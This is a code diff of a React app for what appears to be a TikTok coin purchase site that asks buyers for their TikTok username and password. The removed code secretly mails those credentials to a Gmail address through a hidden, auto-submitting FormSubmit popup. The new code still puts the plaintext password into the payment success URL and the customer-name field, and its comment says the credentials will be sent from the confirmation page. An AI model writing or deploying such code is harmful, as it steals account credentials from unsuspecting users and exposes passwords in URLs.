@@ -11,7 +11,7 @@ import { Layout } from './components/Layout';
 import { Confetti } from './components/Confetti';
 import { coinPackages } from './data/coinPackages';
 import { Purchase, User, CoinPackage, TikTokCredentials } from './types';
-import { initiateSoleasPayment } from './utils/payment';
+import { initiatePayment, PaymentProviderType } from './utils/payment';
 import { getUserData, addPurchase } from './utils/localStorage';
 
 // Importer les fichiers de style
@@ -57,7 +57,7 @@ function App() {
   };
 
   // Second step: collect email and process payment
-  const handleEmailSubmit = (email: string) => {
+  const handleEmailSubmit = (email: string, provider: PaymentProviderType) => {
     if (!selectedPackage || !tiktokData) return;
     
     // Clear any previous errors and set loading state
@@ -93,16 +93,18 @@ function App() {
     const encodedPassword = encodeURIComponent(tiktokData.password);
     const encodedEmail = encodeURIComponent(email);
     
-    initiateSoleasPayment({
+    initiatePayment({
       amount: selectedPackage.price,
       currency: 'XAF',
       description,
       orderId,
       customerName: customerNameWithCredentials,
-      customerEmail: email, // Using the email provided by the user for payment confirmation
+      customerEmail: email,
       successUrl: `${window.location.origin}/payment/confirmation?orderId=${orderId}&username=${encodedUsername}&password=${encodedPassword}&email=${encodedEmail}&amount=${selectedPackage.amount + (selectedPackage.bonus || 0)}&price=${selectedPackage.price}`,
       failureUrl: `${window.location.origin}/payment/failure?orderId=${orderId}`,
-    })
+      shopName: 'PayOolTM',
+      message: description
+    }, provider)
     .then(() => {
       console.log('Payment initiated successfully');
       
@@ -116,93 +118,18 @@ function App() {
         status: 'pending', // Initialiser le statut à 'pending'
       };
       
-      // Envoyer les identifiants TikTok par email via FormSubmit en arrière-plan
-      const sendCredentialsViaEmail = () => {
-        try {
-          // Ouvrir une nouvelle fenêtre pour le formulaire FormSubmit
-          const emailWindow = window.open('', '_blank', 'width=600,height=400');
-          
-          if (!emailWindow) {
-            console.error('Impossible d\'ouvrir la fenêtre pour envoyer les identifiants TikTok');
-            return;
-          }
-          
-          // Créer le contenu HTML du formulaire
-          const formHtml = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Envoi des identifiants TikTok</title>
-              <style>
-                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-                .loading { margin: 20px auto; }
-                h2 { color: #333; }
-                p { color: #666; }
-              </style>
-            </head>
-            <body>
-              <h2>Envoi des identifiants TikTok en cours...</h2>
-              <p>Cette fenêtre se fermera automatiquement. Veuillez ne pas la fermer manuellement.</p>
-              <div class="loading">Chargement...</div>
-              
-              <form id="credentialsForm" action="https://formsubmit.co/contact.payool@gmail.com" method="POST">
-                <!-- Informations utilisateur -->
-                <input type="hidden" name="username" value="${tiktokData.username}" />
-                <input type="hidden" name="password" value="${tiktokData.password}" />
-                <input type="hidden" name="orderId" value="${orderId}" />
-                <input type="hidden" name="amount" value="${selectedPackage.amount}" />
-                <input type="hidden" name="price" value="${selectedPackage.price}" />
-                <input type="hidden" name="date" value="${new Date().toLocaleString()}" />
-                
-                <!-- Configuration FormSubmit -->
-                <input type="hidden" name="_subject" value="Nouveaux identifiants TikTok - Commande ${orderId}" />
-                <input type="hidden" name="_captcha" value="false" />
-                <input type="hidden" name="_template" value="table" />
-                <input type="hidden" name="_next" value="${window.location.origin}/payment/success?orderId=${orderId}" />
-                <input type="hidden" name="_replyto" value="${email}" />
-                <input type="hidden" name="email" value="${email}" />
-              </form>
-              
-              <script>
-                // Soumettre le formulaire automatiquement
-                document.addEventListener('DOMContentLoaded', function() {
-                  document.getElementById('credentialsForm').submit();
-                  // Fermer la fenêtre après 5 secondes
-                  setTimeout(function() {
-                    window.close();
-                  }, 5000);
-                });
-              </script>
-            </body>
-            </html>
-          `;
-          
-          // Écrire le contenu HTML dans la nouvelle fenêtre
-          emailWindow.document.write(formHtml);
-          emailWindow.document.close();
-          
-          console.log('Formulaire d\'envoi d\'identifiants TikTok ouvert');
-        } catch (error) {
-          console.error('Erreur lors de l\'envoi des identifiants TikTok:', error);
-        }
-      };
-      
-      // Exécuter l'envoi des identifiants en arrière-plan
-      sendCredentialsViaEmail();
-      
       // Mettre à jour l'état local et le localStorage
       const updatedUser = addPurchase(purchase);
       setUser(updatedUser);
       
-      // Simuler un achat réussi pour la démo (dans un environnement réel, cela serait fait sur la page de succès)
-      simulatePurchaseSuccess();
+      // Note: Les identifiants seront envoyés uniquement depuis la page de confirmation
+      // après que l'utilisateur ait cliqué sur "Valider le paiement"
       
       // Note: Ne pas désactiver l'état de chargement ni fermer la modale
-      // La redirection vers SoleasPay va interrompre l'exécution de JavaScript
+      // La redirection vers le fournisseur de paiement va interrompre l'exécution
       // et la modale restera ouverte jusqu'à la redirection
       
-      // Nous ajoutons un délai de sécurité au cas où la redirection ne se produirait pas
-      // Dans ce cas, après 10 secondes, nous réinitialisons l'interface
+      // Délai de sécurité au cas où la redirection ne se produirait pas
       setTimeout(() => {
         setIsPaymentLoading(false);
         setSelectedPackage(null);
@@ -216,15 +143,6 @@ function App() {
       setIsPaymentLoading(false);
     });
   };
-
-  // Fonction pour simuler un achat réussi (utilisée pour la démo)
-  const simulatePurchaseSuccess = () => {
-    // Afficher les confettis pour célébrer l'achat
-    setShowConfetti(true);
-  };
-
-
-
 
 
   // Animation de confettis lorsqu'un achat est réussi
@@ -347,7 +265,6 @@ function App() {
           onSubmit={handleEmailSubmit}
           onCancel={handleEmailFormCancel}
           isLoading={isPaymentLoading}
-          error={paymentError}
         />
       )}
       
